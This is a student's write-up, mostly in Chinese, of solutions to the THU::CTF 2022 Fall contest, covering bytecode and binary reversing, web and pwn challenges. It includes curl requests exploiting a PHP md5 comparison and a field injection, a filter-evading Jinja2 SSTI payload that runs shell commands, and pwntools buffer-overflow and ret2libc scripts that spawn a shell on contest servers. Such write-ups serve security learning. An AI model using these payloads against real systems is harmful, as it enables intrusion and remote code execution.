# THU::CTF (2022 Fall) Writeup (tyanyuy3125)

## Info

username: `tyanyuy3125`

team: `cancanneed`

e-mail: `huang-ty21[at]mails.tsinghua.edu.cn`

dept: `E(lectronic)E`

github: `@CodingEric`

周三开始参赛，到周五深夜一共打了三天。所以打的都是dalao们剩下的，而且10月1日出去玩了所以排名 -5 （虽然 -5 之前也是三等奖😇）。

下次一定不迟到早退了😇😇😇

时间太紧了，加上我第一次参加啥也不会，所以只做了大约一半的（简单）题，上传到此处仅做 **归档使用** 。

## test your nc & checkin & survey

最基本的。

## encrypt_level1

`.pyc` 文件可以使用第三方库 `uncompyle` 反编译。

```bash
$ uncompyle6 encrypt_level1.pyc 
# uncompyle6 version 3.8.0
# Python bytecode 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Jun 22 2022, 20:18:18) 
# [GCC 9.4.0]
# Embedded file name: /home/nano/work/thuctf2022/babyre/a.py
# Compiled at: 2022-09-14 14:24:39
# Size of source mod 2**32: 442 bytes
from Crypto.Util.number import *
flag = input('input the flag: ').strip()
A = 6088017296814143863725804132053484123917759442018417244535470520470715974195942594316763622181921394182674
B = 9090370652403187485116422467941196058280737927155245494441669343198058171367456454821955417481153314027631
if A ^ bytes_to_long(flag.encode()) == B:
    print('Right!')
else:
    print('Wrong!')
# okay decompiling encrypt_level1.pyc
```

发现 B 就是 flag 平铺成整数以后按位异或了 A 。

所以再对 B 关于 A 做一次异或就可以得到 flag 了。

## encrypt_level2

使用 IDA 反汇编得到伪代码，有两种求解方法：

- 第一种是根据 main 函数中的语句一行行推测意图（要注意这是经过编译器优化的代码，所以可能循环被展开，并且最后部分针对寄存器做了特别优化）。

- 第二种是发现有一个没有 xref 的 loop0 函数。

```c
void __fastcall loop0(int i)
{
  int v1; // esi
  char v2; // cl

  v1 = i ^ seed[i];
  v2 = v1 ^ i ^ flag[i];
  seed[i + 1] ^= v1;
  flag[i] = v2;
}
```

整理一下，并且写成循环

```c
for(int i=0;i<16;++i){
    int v1 = i ^ seed[i];
    seed[i + 1] ^= v1;
    flag[i] = seed[i] ^ flag[i];
}
```

然后把上述代码的 L4 改写成 `flag[i] = enc[i] ^ seed[i];` 就可以解密 flag 了。

## What is $? - flag1 & 2

审计代码发现对 `action` 字段的检查并不严谨。同时对于 `md5` 的比较存在漏洞。

构造 POST 语句和祖传的密码字段，使用 curl 发送并且存储 cookie：

```bash
curl --data "action=login&cb_user=admin&cb_pass=QNKCDZO&cb_salt=s878926199" http://nc.thuctf.redbud.info:31612/code.php?action=fuck -c cookie.txt
```

进一步观察发现 `uuid` 字段连字符右侧的部分没有合法性检查，同时发现 `autoload` 和 `lib\Flag::FLAG1` 可供利用。

```bash
curl --data "item[name]=Name&item[uuid]=12345678-','lib/flag.php')##########&item[content]=hackeeeeeeeeeeeeeeer" http://nc.thuctf.redbud.info:31612/code.php?action=save_item -b cookie.txt
```

一次性取出 flag1 和 flag2 。

## PyChall - flag1

发现其中的请求测试工具可以使用 SSTI 。直接写入 `{{config}}` ，读取得到：

```json
'SECRET_KEY': '...'
```

然后通过 cookie 伪造 session 即可。

## PyChall - flag2

在远端服务器上搭一个小小的 http server ，然后一直发送请求测试，最终得到了这段代码：

```python
{{ ""[(dict(__cl=aa,ass__=dd )|join)][(dict(__ba=aa,ses__=dd )|join)][0][(dict(__subcl=aa,asses__=dd )|join)]()[137][(dict(__in=aa,it__=dd )|join)][(dict(__glo=aa,bals__=dd )|join)][(dict(__buil=aa,tins__=dd )|join)][(dict(ev=aa,al=dd )|join)]("__import__(\x22os\x22).popen(\x22cd / && ./readflag\x22).read()") }}
```

## baby_gitlab

这题解法和工具已经满天飞了。可以直接使用现成的渗透工具反弹终端，然后读 flag 即可。（并且喜提校园网警告）

## 人間観察バラエティ

寄了。

## babystack_level0

```python
from pwn import*

conn = remote('nc.thuctf.redbud.info', 31673)
payload = b'a'*120 + p64(0x4006C7)
conn.sendline(payload)
conn.interactive()
```

## babystack_level1

善用 IDA。

唯一一点需要注意的是 payload 要发一个 `ret` 对齐一下。

```python
from pwn import *

sh = remote('nc.thuctf.redbud.info', 31726)

sh = process("./babystack_level1")
# elf = ELF("./babystack_level1")
sh.recvuntil(b'What\'s your name?\n')
sh.sendline(b'/bin/sh')
sh.recvuntil(b'Just tell me your wish:')
sh.sendline(103*b'A'+b'B')
sh.recvuntil(b'AB')

recvcan = sh.recv(8)
canary = u64(recvcan)
canary = canary - ord('\n')

read_in_ptr = p64(0x040079A)
run_ptr = p64(0x4007EB)
system_ptr = p64(0x400660)
name_loc = p64(0x6010A0)
command_loc = p64(0x4009C8)
flag_ptr = p64(0x400787)
pop_rdi = p64(0x4009a3)
ret = p64(0x400616)
libc_system_ptr = p64(0x7ffff7e1e290)

payload = 104*b'A'
payload += p64(canary)
payload += 8*b'\x42'
payload += ret
payload += pop_rdi
payload += name_loc
payload += libc_system_ptr

sh.recvuntil(b'I\'ll give you a second chance:')
sh.sendline(payload)
sh.interactive()
```

## babystack_level2

**注意 ASLR ！！！！！**

这题的一个小坑点是服务器上的 libc 版本和本地可能是不一样的。要先处理一番获得服务器的 libc 版本是 2.23 ，然后再计算有关的内存偏移。

```python
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

pop_rdi_ret = p64(0x400803)
ret = p64(0x400546)
puts_plt_addr = p64(0x400560)
main_addr = p64(0x400787)
puts_got_addr = p64(0x601098)
flag_addr = p64(0x400687)
strcmp_addr = p64(0x400580)

offset = 112*b'X'
elf = ELF('./babystack_level2')
libc = elf.libc

libc_finder = offset + 8*b'A' + pop_rdi_ret + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])

sh = remote('nc.thuctf.redbud.info', 31790)
sh.recvuntil(b'wish:\n')
sh.sendline(libc_finder)
sh.recvuntil(b'Bye\n')
recvsh = sh.recv(6)
puts_leak = u64(recvsh + b'\x00\x00')
log.success(f'PUTS: {hex(puts_leak)}')

real_system_addr = puts_leak - 0x2A300
real_sh_addr = puts_leak - 0x6F6A0 + 0x18CE57

payload = offset + 8*b'A' + ret + pop_rdi_ret
payload += p64(real_sh_addr)
payload += p64(real_system_addr)

sh.recvuntil(b'2022\n')
sh.recvuntil(b'wish:\n')
sh.sendline(payload)

sh.interactive()
```

## Treasure Hunter 系列

- 清芬门口海报背面的二维码。

- Plus: 网页中每个按钮的图片都有一串和附件中图片对应的序列。

- PlusPlus: 出去走走。

## flagmarket_level1

出售 flag 的时候价格可以设置为负。

直接用 **自然语言指令 + 生物器官** 进行解题：

```
1
ADMIN
4
-158526706883441459
flg
7
1
admin_
5
1
5
0
3
0
t
复制sig
3
0
粘贴sig
```

## flagmarket_level2

- sell（5311） 指令恰好全部是数字，所以程序给这个命令签名的过程恰好给价格 5311 做了签名。

- 签名和验证机制有 bug ，例如它无法区分 `'AB' + 'CD'` 和 `'A' + 'BCD'` 。

- setprice 没有检查符号。

- 坏了😨，这题我也是手操的，但是我好像没保存 **自然语言指令** 。由于我实在不想再撸一遍这题了，所以简单介绍一下过程：
  
  - 注册一个 test-158526706883441 。
  
  - 执行 5311 但不出售，获取 sig。
  
  - 注销。
  
  - 注册一个 test。
  
  - 执行 5311，设置任意合法价格。
  
  - 修改价格为 -1585267068834415311 ，使用之前的sig。
  
  - 注销。
  
  - 回到 test-158526706883441。
  
  - 购买以获得钱。
  
  - 购买真的 flag。
  
  - 查看内容。

## 小可莉能有什么坏心思呢

# 我草，OP！

打开ps瞎调就行了。

```
D = etmv
C = kfdb
A = chtg
B = zjsv
E = dcps
F = rqqy

ABCDEF

chtgzjsvkfdbetmvdcpsrqqy
```
